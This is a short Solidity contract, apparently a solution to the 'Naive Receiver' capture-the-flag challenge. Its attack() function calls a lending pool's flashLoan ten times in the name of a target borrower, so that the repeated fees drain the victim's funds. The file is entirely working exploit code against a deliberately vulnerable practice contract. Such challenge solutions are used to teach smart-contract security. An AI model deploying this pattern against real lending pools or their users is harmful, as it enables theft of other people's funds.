// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface INaiveLenderPool{
    function flashLoan(address borrower, uint256 borrowAmount) external;
}

contract NaiveReceiverProxy{
    // Variables
    INaiveLenderPool inl;

    // Constructor
    constructor(address _inl){
        require(_inl != address(0), "INL is zero address!!!");
        inl = INaiveLenderPool(_inl);
    }
    // Functions
    function attack(address payable  _target, uint256 _amount) public {
        for(uint256 i = 0; i < 10; i++){
            inl.flashLoan(_target, _amount);
        }
    }
}